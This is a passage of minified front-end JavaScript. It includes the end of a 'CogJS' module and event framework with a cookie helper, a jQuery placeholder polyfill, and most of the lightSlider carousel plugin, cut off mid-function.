j(this.targetModules.map,this.maxGroupSize).eachItem(this.initProcessor,this).done(t.proxy(e.resolve,e)).fail(this.rejectDelegate)},beforeInitProcessor:function(e){e.beforeInit()},initProcessor:function(e){var n=null;this.$elements&&e.selector&&(n=this.$elements.filter(e.selector).addClass(i.initializedClass)),e.init(n||t())}}),O=s.extend(T,{logger:p.create("InitModulesTaskQueue"),accepts:function(e){return e.$scope&&e.$scope.length&&(!e.moduleIds||e.moduleIds.length>0)},join:function(e,t){var n=this.tasks[t];this.logger.trace("join task",{source:e.id,target:n.id,targetIndex:t}),this.joinTasks(n,e)},joinTasks:function(e,n){this.joinScopes(e,n),this.joinModules(e,n);var i=n.deferred;e.promise.always(t.proxy(i.resolve,i))},joinScopes:function(e,t){v.isInScope(t.$scope,e.$scope)?e.$scope=t.$scope:e.$scope.is(t.$scope)||v.isInScope(e.$scope,t.$scope)||(e.$scope=e.$scope.add(t.$scope))},joinModules:function(e,t){!e.processAllModules()&&t.processAllModules()?e.moduleIds=null:e.processAllModules()||t.processAllModules()||(e.moduleIds=this.joinModuleIds(e.moduleIds,t.moduleIds))},joinModuleIds:function(e,t){var n=e.length-t.length,i=n>=0?e:t,s=n<=0?t:e;return this.addModuleIds(s,i),i},addModuleIds:function(e,n){var i;for(i=0;i<e.length;i++)t.inArray(e[i],n)<0&&n.push(e[i])},joinIndex:function(e){var t=O.superclass.joinIndex.call(this,e);return null!==t?this.findJoinIndex(e,t):null},findJoinIndex:function(e,t){var n,i=null,s=this.tasks;for(n=t;null===i&&n<s.length;n++)this.isTaskJoinable(s[n],e)&&(i=n);return i},anyProcessesAllModules:function(e,t){return t.processAllModules()||e.processAllModules()},isTaskJoinable:function(e,t){var n=t.$scope.is(e.$scope);return n||(n=t.processAllModules()&&e.processAllModules()),n||this.anyProcessesAllModules(e,t)||(n=this.equalModuleIds(t.moduleIds,e.moduleIds)),n},equalModuleIds:function(e,n){var i,s=e.length==n.length;for(i=0;s&&i<e.length;i++)s=t.inArray(e[i],n)>=0;return s}}),V=s.define({defaults:{propertyName:"$scope",onUnregister:i.noOperation,onRegister:function(e){return{$scope:e}},scope:null},components:null,config:null,constructor:function(e){e=e||{},this.components=[],this.config=t.extend(!0,{},this.defaults,e),t.isFunction(this.config.onRegister)||(this.config.onRegister=this.defaults.onRegister)},register:function(e){var t,n,i=this.config.onRegister,s=this.config.scope;for(n=0;n<e.length;n++)t=i.call(s,e.eq(n)),this.components.push(t)},unregister:function(e){var t,n=this.indexOfComponent(e);n>=0&&(t=this.components[n],this.components.splice(n,1),this.config.onUnregister.call(this.config.scope,t))},indexOfComponent:function(e){var t=this.components,n=this.config.propertyName;return null!=t&&null!=n&&(t=this.selectProperty(n)),v.indexOfElement(t,e)},selectProperty:function(e){var t,n,i=this.components,s=[],r={};for(n=0;n<i.length;n++)(t=(t=i[n]||r)[e])&&s.push(t);return s}}),H=s.define({name:null,api:null,sharedApi:null,externalApi:null,requires:null,constructor:function(e){this.name=e.name,this.api=e.api,this.sharedApi=e.sharedApi||null,this.externalApi=e.externalApi||{},this.requires=e.requires||i.emptyArray,this.processApi(),this.updateRequiredModules()},init:function(){this.api.init()},updateRequiredModules:function(){var e,n,i=this.requires;for(n=0;n<i.length;n++)e=i[n],"string"===t.type(e)&&(i[n]={name:e})},processApi:function(){this.api.init=this.processDelegate(this.api.init),this.api.external=this.externalApi},processDelegate:function(e){return this.isValidDelegate(e)?e:i.noOperation},isValidDelegate:function(e){return t.isFunction(e)}}),U=s.extend(H,{$elements:null,selector:null,hasFinalize:!1,constructor:function(e){U.superclass.constructor.call(this,e),this.beforeInit=e.api.beforeInit||i.noOperation,this.selector=e.selector||null,this.isFinalizable()&&(this.$elements=t())},init:function(e){this.isFinalizable()&&(this.$elements=this.$elements.add(e)),this.api.init(e)},beforeInit:function(){this.api.beforeInit()},finalize:function(e){this.hasFinalize&&this.api.finalize(e)},isFinalizable:function(){return this.hasFinalize},processApi:function(){U.superclass.processApi.call(this);var e=this.api;e.beforeInit=this.processDelegate(e.beforeInit),this.hasFinalize=this.isValidDelegate(e.finalize)}}),B=s.extend(U,{componentManager:null,constructor:function(e){B.superclass.constructor.call(this,e),this.componentManager=new V({onRegister:this.onRegister,onUnregister:this.api.onUnregister,scope:this})},init:function(e){e.length>0&&this.componentManager.register(e),B.superclass.init.call(this,e)},onRegister:function(e){var t={$scope:e};return this.api.onRegister(t),t},finalize:function(e){B.superclass.finalize.call(this,e),this.componentManager.unregister(e)},isFinalizable:function(){return!0},processApi:function(){B.superclass.processApi.call(this),this.api.onRegister=this.processDelegate(this.api.onRegister),this.api.onUnregister=this.processDelegate(this.api.onUnregister)}}),J=s.extend(M,{id:function(e){return e.name},dependencies:function(e){return e.requires},dependencyId:function(e){return e.name}}),L=s.extend(A,{logger:p.create("InitStaticModuleTask"),maxGroupSize:i.modulesGroupSize,moduleIds:null,modules:null,constructor:function(e,t){L.superclass.constructor.call(this),this.modules=t,this.moduleIds=[],e&&this.moduleIds.push(e)},execute:function(){var e=this.modules.selectValues(this.moduleIds),n=new j(e,this.maxGroupSize);this.logger.trace("executing",this.id,this.moduleIds);var i=this.deferred;n.eachItem(this.itemProcessor,this).always(t.proxy(i.resolve,i))},itemProcessor:function(e){e.init()}}),W=s.extend(P,{logger:p.create("InitStaticModuleTaskQueue"),accepts:function(e){return e.moduleIds.length},process:function(e){this.tasks.length>0?this.join(e):W.superclass.process.call(this,e)},join:function(e){var n=this.tasks[0];this.logger.trace("join task",{source:e.id,target:n.id});var i=n.moduleIds;i.push.apply(i,e.moduleIds);var s=e.deferred;n.promise.always(t.proxy(s.resolve,s))}}),_=s.define({modules:null,constructor:function(){this.modules=new g},add:function(e){this.modules.add(e.name,e)}}),X=s.extend(_,{taskRunner:null,taskQueue:null,constructor:function(e,t){X.superclass.constructor.call(this),this.taskRunner=e,this.taskQueue=t},add:function(e){X.superclass.add.call(this,e),this.taskQueue.add(new L(e.name,this.modules)),this.taskRunner.executeNext()}}),K=s.extend(_,{finalizableModules:null,constructor:function(){K.superclass.constructor.call(this),this.finalizableModules=new g},add:function(e){K.superclass.add.call(this,e),e.isFinalizable()&&this.finalizableModules.add(e.name,e)}}),Y=s.extend(o,{events:null,constructor:function(){this.events={}},dispatcherFor:function(e,t){var n=null,i=this.events;if(e&&t){var s=i[e];s&&s[t]||this.addEvent(e,t),n=i[e][t]}return n},addEvent:function(e,t){var n=this.events;n[e]||(n[e]={});var i=n[e];i[t]||(i[t]=new b(e,t))}}),Z=s.extend(u,{logger:p.create("ModuleManager"),dependencyGraph:null,modules:null,staticModuleRegistry:null,dynamicModuleRegistry:null,constructor:function(e,t){this.dependencyGraph=new S(new J),this.staticModuleRegistry=e,this.dynamicModuleRegistry=t,this.modules={}},add:function(e){var t=this.logger;if(t.trace("trying add module",e.name),!this.dependencyGraph.hasNode(e)){this.modules[e.name]=e,t.trace("module added",e.name);var n=this.dependencyGraph.resolve(e);t.debug("resolved module id's",n),null!=n&&this.initializeModules(n)}},initializeModules:function(e){var t,n,i=this.modules;for(n=0;n<e.length;n++)(t=i[e[n]])&&this.initializeModule(t)},initializeModule:function(e){this.injectApi(e),(e instanceof U?this.dynamicModuleRegistry:this.staticModuleRegistry).add(e)},injectApi:function(e){var t,n,i,s=this.modules,r=e.requires;for(i=0;i<r.length;i++)t=s[(n=r[i]).name],n.apiId&&(e.externalApi[n.apiId]=t.sharedApi||null)}}),ee=s.extend(l,{constructor:function(){this.initStaticModule=new W,this.initializeDynamicModuleQueues()},initializeDynamicModuleQueues:function(){var e=new R;this.initDynamicModules=new O(e);var t=new R;this.finalizeDynamicModules=new G(t),e.addQueue(this.finalizeDynamicModules),t.addQueue(this.initDynamicModules)}}),te=s.asSingleton(s.extend(r,{eventManager:null,taskQueues:null,taskRunner:null,moduleManager:null,dynamicModuleRegistry:null,ready:!1,constructor:function(){this.eventManager=new Y,this.taskQueues=new ee,this.taskRunner=this.initializeTaskRunner(),this.moduleManager=this.initializeModuleManager(),this.dynamicModuleRegistry=this.moduleManager.dynamicModuleRegistry,this.whenReady(t.proxy(this.onReady,this))},isValidModuleConfig:function(e){return e&&e.name&&e.api},addModule:function(e){this.moduleManager.add(e)},queueInitTask:function(e,t){var n=new C(e,t,this.dynamicModuleRegistry.modules);return this.taskQueues.initDynamicModules.add(n),this.taskRunner.executeNext(),n.promise},queueFinalizeTask:function(e){var t=new E(e,this.dynamicModuleRegistry.finalizableModules);return this.taskQueues.finalizeDynamicModules.add(t),this.taskRunner.executeNext(),t.promise},whenReady:function(n){t(e).ready(n)},isReady:function(){return this.ready},onReady:function(){this.ready=!0},initializeTaskRunner:function(){var e=new $,t=this.taskQueues;e.addQueue(t.initStaticModule);var n=new R;return n.addQueue(t.initDynamicModules),n.addQueue(t.finalizeDynamicModules),e.addQueue(n),e},initializeModuleManager:function(){var e=new X(this.taskRunner,this.taskQueues.initStaticModule),t=new K;return new Z(e,t)}})).create().instance(),ne=p.create("CogJS",3);return n.Type={define:s.define,extend:s.extend,asSingleton:s.asSingleton},n.registerStatic=function(e){te.isValidModuleConfig(e)?te.addModule(new H(e)):ne.error("Invalid StaticModule config",e)},n.register=function(e){te.isValidModuleConfig(e)?te.addModule(new U(e)):ne.error("Invalid DynamicModule config",e)},n.registerComponent=function(e){te.isValidModuleConfig(e)&&t.isFunction(e.api.onRegister)?te.addModule(new B(e)):ne.error("Invalid ComponentModule config",e)},n.finalize=function(e){return te.isReady()?te.queueFinalizeTask(e||t(i.globalScopeSelector)):null},n.init=function(e){return function(){var n=null;return te.isReady()&&(e=e||{},n=te.queueInitTask(function(e){return e.$element||t(i.globalScopeSelector)}(e),function(e){return t.isArray(e.modules)?e.modules:null}(e))),n}}(),n.addListener=function(e,n,i,s){var r=t.isFunction(i)?te.eventManager.dispatcherFor(e,n):null,o=null;return null!=r?o=r.addHandler(i,s):ne.error("Invalid EventHandler config",arguments),o},n.removeListener=function(e){var t=!1;return e&&(t=te.eventManager.dispatcherFor(e.module,e.event).removeHandler(e.id)),t},n.fireEvent=function(e,t,n){var i=te.eventManager.dispatcherFor(e,t);null!=i&&i.dispatch(n)},n.fireEventAsync=function(e,t,n){var i=te.eventManager.dispatcherFor(e,t);null!=i&&i.dispatchAsync(n)},n.ready=function(e){te.whenReady(e)},n.isInScope=function(e,t){return v.isInScope(e,t)},n.find=function(e,t){return v.find(e,t)},n.jQuery=function(){return t},n.logger=function(e,t){var n=null;return e&&(n=y.create(p.create(e,t),["error","debug","info"])),n},n.Cookie={create:function(t,n,i){var s,r="";i&&((s=new Date).setTime(s.getTime()+24*i*60*60*1e3),r="; expires="+s.toGMTString()),e.cookie=t+"="+n+r+"; path=/"},read:function(t){var n,i=t+"=",s=e.cookie.split(";"),r=null;for(n=0;n<s.length;n++){for(r=s[n];" "==r.charAt(0);)r=r.substring(1,r.length);if(0===r.indexOf(i))return r.substring(i.length,r.length)}return null},erase:function(e){n.Cookie.create(e,"",-1)}},te.whenReady(n.init),n}(document,jQuery.noConflict(!0));
!function(e,t,a){var l,r,o="placeholder"in t.createElement("input"),d="placeholder"in t.createElement("textarea"),i=a.fn,c=a.valHooks;function n(e,l){var r=a(this);if(this.value==r.attr("placeholder")&&r.hasClass("placeholder"))if(r.data("placeholder-password")){if(r=r.hide().next().show().attr("id",r.removeAttr("id").data("placeholder-id")),!0===e)return r[0].value=l;r.focus()}else this.value="",r.removeClass("placeholder"),this==t.activeElement&&this.select()}function h(){var e,t,l,r,o=a(this),d=this.id;if(""==this.value){if("password"==this.type){if(!o.data("placeholder-textinput")){try{e=o.clone().attr({type:"text"})}catch(o){e=a("<input>").attr(a.extend((t=this,l={},r=/^jQuery\d+$/,a.each(t.attributes,function(e,t){t.specified&&!r.test(t.name)&&(l[t.name]=t.value)}),l),{type:"text"}))}e.removeAttr("name").data({"placeholder-password":!0,"placeholder-id":d}).bind("focus.placeholder",n),o.data({"placeholder-textinput":e,"placeholder-id":d}).before(e)}o=o.removeAttr("id").hide().prev().attr("id",d).show()}o.addClass("placeholder"),o[0].value=o.attr("placeholder")}else o.removeClass("placeholder")}o&&d?(r=i.placeholder=function(){return this}).input=r.textarea=!0:((r=i.placeholder=function(){return this.filter((o?"textarea":":input")+"[placeholder]").not(".placeholder").bind({"focus.placeholder":n,"blur.placeholder":h}).data("placeholder-enabled",!0).trigger("blur.placeholder"),this}).input=o,r.textarea=d,l={get:function(e){var t=a(e);return t.data("placeholder-enabled")&&t.hasClass("placeholder")?"":e.value},set:function(e,l){var r=a(e);return r.data("placeholder-enabled")?(""==l?(e.value=l,e!=t.activeElement&&h.call(e)):r.hasClass("placeholder")&&n.call(e,!0,l)||(e.value=l),r):e.value=l}},o||(c.input=l),d||(c.textarea=l),a(function(){a(t).delegate("form","submit.placeholder",function(){var e=a(".placeholder",this).each(n);setTimeout(function(){e.each(h)},10)})}),a(e).bind("beforeunload.placeholder",function(){a(".placeholder").each(function(){this.value=""})}))}(this,document,Cog.jQuery());
!function(e){"use strict";var i={item:3,autoWidth:!1,slideMove:1,slideMargin:10,addClass:"",mode:"slide",useCSS:!0,cssEasing:"ease",easing:"linear",speed:400,auto:!1,pauseOnHover:!1,loop:!1,slideEndAnimation:!0,pause:2e3,keyPress:!1,controls:!0,prevHtml:"",nextHtml:"",rtl:!1,adaptiveHeight:!1,vertical:!1,verticalHeight:500,vThumbWidth:100,thumbItem:10,pager:!0,gallery:!1,galleryMargin:5,thumbMargin:5,currentPagerPosition:"middle",enableTouch:!0,enableDrag:!0,freeMove:!0,swipeThreshold:40,responsive:[],onBeforeStart:function(e){},onSliderLoad:function(e){},onBeforeSlide:function(e,i){},onAfterSlide:function(e,i){},onBeforeNextSlide:function(e,i){},onBeforePrevSlide:function(e,i){}};e.fn.lightSlider=function(t){if(0===this.length)return this;if(this.length>1)return this.each(function(){e(this).lightSlider(t)}),this;var n={},l=e.extend(!0,{},i,t),a={},s=this;n.$el=this,"fade"===l.mode&&(l.vertical=!1);var o=s.children(),r=e(window).width(),d=null,c=0,u=0,f=!1,h=0,g="",v=0,p=!0===l.vertical?"height":"width",m=!0===l.vertical?"margin-bottom":"margin-right",S=0,b=0,C=0,M=0,T=null,x="ontouchstart"in document.documentElement,w={chbreakpoint:function(){if(r=e(window).width(),l.responsive.length){var i;if(!1===l.autoWidth&&(i=l.item),r<l.responsive[0].breakpoint)for(var t=0;t<l.responsive.length;t++)r<l.responsive[t].breakpoint&&(l.responsive[t].breakpoint,d=l.responsive[t]);if(null!=d)for(var n in d.settings)d.settings.hasOwnProperty(n)&&(void 0!==a[n]&&null!==a[n]||(a[n]=l[n]),l[n]=d.settings[n]);if(!e.isEmptyObject(a)&&r>l.responsive[0].breakpoint)for(var s in a)a.hasOwnProperty(s)&&(l[s]=a[s]);!1===l.autoWidth&&S>0&&C>0&&i!==l.item&&(v=Math.round(S/((C+l.slideMargin)*l.slideMove)))}},calSW:function(){!1===l.autoWidth&&(C=(h-(l.item*l.slideMargin-l.slideMargin))/l.item)},calWidth:function(e){var i=!0===e?g.find(".lslide").length:o.length;if(!1===l.autoWidth)u=i*(C+l.slideMargin);else{u=0;for(var t=0;t<i;t++)u+=parseInt(o.eq(t).width())+l.slideMargin}return u}};return(n={doCss:function(){return!(!l.useCSS||!function(){for(var e=["transition","MozTransition","WebkitTransition","OTransition","msTransition","KhtmlTransition"],i=document.documentElement,t=0;t<e.length;t++)if(e[t]in i.style)return!0}())},keyPress:function(){l.keyPress&&e(document).on("keyup.lightslider",function(i){e(":focus").is("input, textarea")||(i.preventDefault?i.preventDefault():i.returnValue=!1,37===i.keyCode?s.goToPrevSlide():39===i.keyCode&&s.goToNextSlide())})},controls:function(){l.controls&&(s.after('<div class="lSAction"><a class="lSPrev">'+l.prevHtml+'</a><a class="lSNext">'+l.nextHtml+"</a></div>"),l.autoWidth?w.calWidth(!1)<h&&g.find(".lSAction").hide():c<=l.item&&g.find(".lSAction").hide(),g.find(".lSAction a").on("click",function(i){return i.preventDefault?i.preventDefault():i.returnValue=!1,"lSPrev"===e(this).attr("class")?s.goToPrevSlide():s.goToNextSlide(),!1}))},initialStyle:function(){var e=this;"fade"===l.mode&&(l.autoWidth=!1,l.slideEndAnimation=!1),l.auto&&(l.slideEndAnimation=!1),l.autoWidth&&(l.slideMove=1,l.item=1),l.loop&&(l.slideMove=1,l.freeMove=!1),l.onBeforeStart.call(this,s),w.chbreakpoint(),s.addClass("lightSlider").wrap('<div class="lSSlideOuter '+l.addClass+'"><div class="lSSlideWrapper"></div></div>'),g=s.parent(".lSSlideWrapper"),!0===l.rtl&&g.parent().addClass("lSrtl"),l.vertical?(g.parent().addClass("vertical"),h=l.verticalHeight,g.css("height",h+"px")):h=s.outerWidth(),o.addClass("lslide"),!0===l.loop&&"slide"===l.mode&&(w.calSW(),w.clone=function(){if(w.calWidth(!0)>h){for(var i=0,t=0,n=0;n<o.length&&(t++,!((i+=parseInt(s.find(".lslide").eq(n).width())+l.slideMargin)>=h+l.slideMargin));n++);var a=!0===l.autoWidth?t:l.item;if(a<s.find(".clone.left").length)for(var r=0;r<s.find(".clone.left").length-a;r++)o.eq(r).remove();if(a<s.find(".clone.right").length)for(var d=o.length-1;d>o.length-1-s.find(".clone.right").length;d--)v--,o.eq(d).remove();for(var c=s.find(".clone.right").length;c<a;c++)s.find(".lslide").eq(c).clone().removeClass("lslide").addClass("clone right").appendTo(s),v++;for(var u=s.find(".lslide").length-s.find(".clone.left").length;u>s.find(".lslide").length-a;u--)s.find(".lslide").eq(u-1).clone().removeClass("lslide").addClass("clone left").prependTo(s);o=s.children()}else o.hasClass("clone")&&(s.find(".clone").remove(),e.move(s,0))},w.clone()),w.sSW=function(){c=o.length,!0===l.rtl&&!1===l.vertical&&(m="margin-left"),!1===l.autoWidth&&o.css(p,C+"px"),o.css(m,l.slideMargin+"px"),u=w.calWidth(!1),s.css(p,u+"px"),!0===l.loop&&"slide"===l.mode&&!1===f&&(v=s.find(".clone.left").length)},w.calL=function(){o=s.children(),c=o.length},this.doCss()&&g.addClass("usingCss"),w.calL(),"slide"===l.mode?(w.calSW(),w.sSW(),!0===l.loop&&(S=e.slideValue(),this.move(s,S)),!1===l.vertical&&this.setHeight(s,!1)):(this.setHeight(s,!0),s.addClass("lSFade"),this.doCss()||(o.fadeOut(0),o.eq(v).fadeIn(0))),!0===l.loop&&"slide"===l.mode?o.eq(v).addClass("active"):o.first().addClass("active")},pager:function(){var e=this;if(w.createPager=function(){M=(h-(l.thumbItem*l.thumbMargin-l.thumbMargin))/l.thumbItem;var i=g.find(".lslide"),t=g.find(".lslide").length,n=0,a="",o=0;for(n=0;n<t;n++){"slide"===l.mode&&(l.autoWidth?o+=(parseInt(i.eq(n).width())+l.slideMargin)*l.slideMove:o=n*((C+l.slideMargin)*l.slideMove));var r=i.eq(n*l.slideMove).attr("data-thumb");if(!0===l.gallery?a+='<li style="width:100%;'+p+":"+M+"px;"+m+":"+l.thumbMargin+'px"><a href="#"><img src="'+r+'" /></a></li>':a+='<li><a href="#">'+(n+1)+"</a></li>","slide"===l.mode&&o>=u-h-l.slideMargin){n+=1;var d=2;l.autoWidth&&(a+='<li><a href="#">'+(n+1)+"</a></li>",d=1),n<d?(a=null,g.parent().addClass("noPager")):g.parent().removeClass("noPager");break}}var c=g.parent();c.find(".lSPager").html(a),!0===l.gallery&&(!0===l.vertical&&c.find(".lSPager").css("width",l.vThumbWidth+"px"),b=n*(l.thumbMargin+M)+.5,c.find(".lSPager").css({property:b+"px","transition-duration":l.speed+"ms"}),!0===l.vertical&&g.parent().css("padding-right",l.vThumbWidth+l.galleryMargin+"px"),c.find(".lSPager").css(p,b+"px"));var f=c.find(".lSPager").find("li");f.first().addClass("active"),f.on("click",function(){return!0===l.loop&&"slide"===l.mode?v+=f.index(this)-c.find(".lSPager").find("li.active").index():v=f.index(this),s.mode(!1),!0===l.gallery&&e.slideThumb(),!1})},l.pager){var i="lSpg";l.gallery&&(i="lSGallery"),g.after('<ul class="lSPager '+i+'"></ul>');var t=l.vertical?"margin-left":"margin-top";g.parent().find(".lSPager").css(t,l.galleryMargin+"px"),w.createPager()}setTimeout(function(){w.init()},0)},setHeight:function(e,i){var t=null,n=this;t=l.loop?e.children(".lslide ").first():e.children().first();var a=function(){var n=t.outerHeight(),l=0,a=n;i&&(n=0,l=100*a/h),e.css({height:n+"px","padding-bottom":l+"%"})};a(),t.find("img").length?t.find("img")[0].complete?(a(),T||n.auto()):t.find("img").on("load",function(){setTimeout(function(){a(),T||n.auto()},100)}):T||n.auto()},active:function(e,i){this.doCss()&&"fade"===l.mode&&g.addClass("on");var t,n,a=0;v*l.slideMove<c?(e.removeClass("active"),this.doCss()||"fade"!==l.mode||!1!==i||e.fadeOut(l.speed),a=!0===i?v:v*l.slideMove,!0===i&&(n=(t=e.length)-1,a+1>=t&&(a=n)),!0===l.loop&&"slide"===l.mode&&(a=!0===i?v-s.find(".clone.left").length:v*l.slideMove,!0===i&&(n=(t=e.length)-1,a+1===t?a=n:a+1>t&&(a=0))),this.doCss()||"fade"!==l.mode||!1!==i||e.eq(a).fadeIn(l.speed),e.eq(a).addClass("active")):(e.removeClass("active"),e.eq(e.length-1).addClass("active"),this.doCss()||"fade"!==l.mode||!1!==i||(e.fadeOut(l.speed),e.eq(a).fadeIn(l.speed)))},move:function(e,i){!0===l.rtl&&(i=-i),this.doCss()?!0===l.vertical?e.css({transform:"translate3d(0px, "+-i+"px, 0px)","-webkit-transform":"translate3d(0px, "+-i+"px, 0px)"}):e.css({transform:"translate3d("+-i+"px, 0px, 0px)","-webkit-transform":"translate3d("+-i+"px, 0px, 0px)"}):!0===l.vertical?e.css("position","relative").animate({top:-i+"px"},l.speed,l.easing):e.css("position","relative").animate({left:-i+"px"},l.speed,l.easing);var t=g.parent().find(".lSPager").find("li");this.active(t,!0)},fade:function(){this.active(o,!1);var e=g.parent().find(".lSPager").find("li");this.active(e,!0)},slide:function(){var e=this;w.calSlide=function(){u>h&&(S=e.slideValue(),e.active(o,!1),S>u-h-l.slideMargin?S=u-h-l.slideMargin:S<0&&(S=0),e.move(s,S),!0===l.loop&&"slide"===l.mode&&(v>=c-s.find(".clone.left").length/l.slideMove&&e.resetSlide(s.find(".clone.left").length),0===v&&e.resetSlide(g.find(".lslide").length)))},w.calSlide()},resetSlide:function(e){var i=this;g.find(".lSAction a").addClass("disabled"),setTimeout(function(){v=e,g.css("transition-duration","0ms"),S=i.slideValue(),i.active(o,!1),n.move(s,S),setTimeout(function(){g.css("transition-duration",l.speed+"ms"),g.find(".lSAction a").removeClass("disabled")},50)},l.speed+100)},slideValue:function(){var e=0;if(!1===l.autoWidth)e=v*((C+l.slideMargin)*l.slideMove);else{e=0;for(var i=0;i<v;i++)e+=parseInt(o.eq(i).width())+l.slideMargin}return e},slideThumb:function(){var e;switch(l.currentPagerPosition){case"left":e=0;break;case"middle":e=h/2-M/2;break;case"right":e=h-M}var i=v-s.find(".clone.left").length,t=g.parent().find(".lSPager");"slide"===l.mode&&!0===l.loop&&(i>=t.children().length?i=0:i<0&&(i=t.children().length));var n=i*(M+l.thumbMargin)-e;n+h>b&&(n=b-h-l.thumbMargin),n<0&&(n=0),this.move(t,n)},auto:function(){l.auto&&(clearInterval(T),T=setInterval(function(){s.goToNextSlide()},l.pause))},pauseOnHover:function(){var i=this;l.auto&&l.pauseOnHover&&(g.on("mouseenter",function(){e(this).addClass("ls-hover"),s.pause(),l.auto=!0}),g.on("mouseleave",function(){e(this).removeClass("ls-hover"),g.find(".lightSlider").hasClass("lsGrabbing")||i.auto()}))},touchMove:function(e,i){if(g.css("transition-duration","0ms"),"slide"===l.mode){var t=S-(e-i);if(t>=u-h-l.slideMargin)if(!1===l.freeMove)t=u-h-l.slideMargin;else{var n=u-h-l.slideMargin;t=n+(t-n)/5}else t<0&&(!1===l.freeMove?t=0:t/=5);this.move(s,t)}},touchEnd:function(e){if(g.css("transition-duration",l.speed+"ms"),"slide"===l.mode){var i=!1,t=!0;(S-=e)>u-h-l.slideMargin?(S=u-h-l.slideMargin,!1===l.autoWidth&&(i=!0)):S<0&&(S=0);var n=function(e){var t=0;if(i||e&&(t=1),l.autoWidth)for(var n=0,a=0;a<o.length&&(n+=parseInt(o.eq(a).width())+l.slideMargin,v=a+t,!(n>=S));a++);else{var s=S/((C+l.slideMargin)*l.slideMove);v=parseInt(s)+t,S>=u-h-l.slideMargin&&s%1!=0&&v++}};e>=l.swipeThreshold?(n(!1),t=!1):e<=-l.swipeThreshold&&(n(!0),t=!1),s.mode(t),this.slideThumb()}else e>=l.swipeThreshold?s.goToPrevSlide():e<=-l.swipeThreshold&&s.goToNextSlide()},enableDrag:function(){var i=this;if(!x){var t=0,n=0,a=!1;g.find(".lightSlider").addClass("lsGrab"),g.on("mousedown",function(i){if(u<h&&0!==u)return!1;"lSPrev"!==e(i.target).attr("class")&&"lSNext"!==e(i.target).attr("class")&&(t=!0===l.vertical?i.pageY:i.pageX,a=!0,i.preventDefault?i.preventDefault():i.returnValue=!1,g.scrollLeft+=1,g.scrollLeft-=1,g.find(".lightSlider").removeClass("lsGrab").addClass("lsGrabbing"),clearInterval(T))}),e(window).on("mousemove",function(e){a&&(n=!0===l.vertical?e.pageY:e.pageX,i.touchMove(n,t))}),e(window).on("mouseup",function(s){if(a){g.find(".lightSlider").removeClass("lsGrabbing").addClass("lsGrab"),a=!1;var o=(n=!0===l.vertical?s.pageY:s.pageX)-t;Math.abs(o)>=l.swipeThreshold&&e(window).on("click.ls",function(i){i.preventDefault?i.preventDefault():i.returnValue=!1,i.stopImmediatePropagation(),i.stopPropagation(),e(window).off("click.ls")}),i.touchEnd(o)}})}},enableTouch:function(){var e=this;if(x){var i={},t={};g.on("touchstart",function(e){t=e.originalEvent.targetTouches[0],i.pageX=e.originalEvent.targetTouches[0].pageX,i.pageY=e.originalEvent.targetTouches[0].pageY,clearInterval(T)}),g.on("touchmove",function(n){if(u<h&&0!==u)return!1;var a=n.originalEvent;t=a.targetTouches[0];var s=Math.abs(t.pageX-i.pageX),o=Math.abs(t.pageY-i.pageY);!0===l.vertical?(3*o>s&&n.preventDefault(),e.touchMove(t.pageY,i.pageY)):(3*s>o&&n.preventDefault(),e.touchMove(t.pageX,i.pageX))}),g.on("touchend",function(){if(u<h&&0!==u)return!1;var n;n=!0===l.vertical?t.pageY-i.pageY:t.pageX-i.pageX,e.touchEnd(n)})}},build:function(){var i=this;i.initialStyle(),this.doCss()&&(!0===l.enableTouch&&i.enableTouch(),!0===l.enableDrag&&i.enableDrag()),e(window).on("focus",function(){i.auto()}),e(window).on("blur",function(){clearInterval(T)}),i.pager(),i.pauseOnHover(),i.controls(),i.keyPress()}}).build(),w.init=function(){w.chbreakpoint(),!0===l.vertical?(h=l.item>1?l.verticalHeight:o.outerHeight(),g.css("height",h+"px")):h=g.outerWidth(),!0===l.loop&&"slide"===l.mode&&w.clone(),w.calL(),"slide"===l.mode&&s.removeClass("lSSlide"),"slide"===l.mode&&(w.calSW(),w.sSW()),setTimeout(function(){"slide"===l.mode&&s.addClass("lSSlide")},1e3),l.pager&&w.createPager(),!0===l.adaptiveHeight&&!1===l.vertical&&s.css("height",o.eq(v).outerHeight(!0)),!1===l.adaptiveHeight&&("slide"===l.mode?!1===l.vertical?n.setHeight(s,!1):n.auto():n.setHeight(s,!0)),!0===l.gallery&&n.slideThumb(),"slide"===l.mode&&n.slide(),!1===l.autoWidth?o.length<=l.item?g.find(".lSAction").hide():g.find(".lSAction").show():w.calWidth(!1)<h&&0!==u?g.find(".lSAction").hide():g.find(".lSAction").show()},s.goToPrevSlide=function(){if(v>0)l.onBeforePrevSlide.call(this,s,v),v--,s.mode(!1),!0===l.gallery&&n.slideThumb();else if(!0===l.loop){if(l.onBeforePrevSlide.call(this,s,v),"fade"===l.mode)v=parseInt((c-1)/l.slideMove);s.mode(!1),!0===l.gallery&&n.slideThumb()}else!0===l.slideEndAnimation&&(s.addClass("leftEnd"),setTimeout(function(){s.removeClass("leftEnd")},400))},s.goToNextSlide=function(){var e=!0;"slide"===l.mode&&(e=n.slideValue()<u-h-l.slideMargin);v*l.slideMove<c-l.slideMove&&e?(l.onBeforeNextSlide.call(this,s,v),v++,s.mode(!1),!0===l.gallery&&n.slideThumb()):!0===l.loop?(l.onBeforeNextSlide.call(this,s,v),v=0,s.mode(!1),!0===l.gallery&&n.slideThumb()):!0===l.slideEndAnimation&&(s.addClass("rightEnd"),setTimeout(function(){s.removeClass("rightEnd")},400))},s.mode=function(e){!0===l.adaptiveHeight&&!1===l.vertical&&s.css("height",o.eq(v).outerHeight(!0)),!1===f&&("slide"===l.mode?n.doCss()&&(s.addClass("lSSlide"),""!==l.speed&&g.css("transition-duration",l.speed+"ms"),""!==l.cssEasing&&g.css("transition-timing-function",l.cssEasing)):n.doCss()&&(""!==l.speed&&s.css("transition-duration",l.speed+"ms"),""!==l.cssEasing&&s.css("transition-timing-function",l.cssEasing))),e||l.onBeforeSlide.call(this,s,v),"slide"===l.mode?n.slide():n.fade(),g.hasClass("ls-hover")||n.auto(),setTimeout(function(){e||l.onAfterSlide.call(this,s,v)},l.speed),f=!0},s.play=function(){s.goToNextSlide(),l.auto=!0,n.auto()},s.pause=function(){l.auto=!1,clearInterval(T)},s.refresh=function(){w.init()},s.getCurrentSlideCount=function(){var e=v;if(l.loop){var i=g.find(".lslide").length,t=s.find(".clone.left").length;e=v<=t-1?i+(v-t):v>=i+t?v-i-t:v-t}return e+1},s.getTotalSlideCount=function(){return 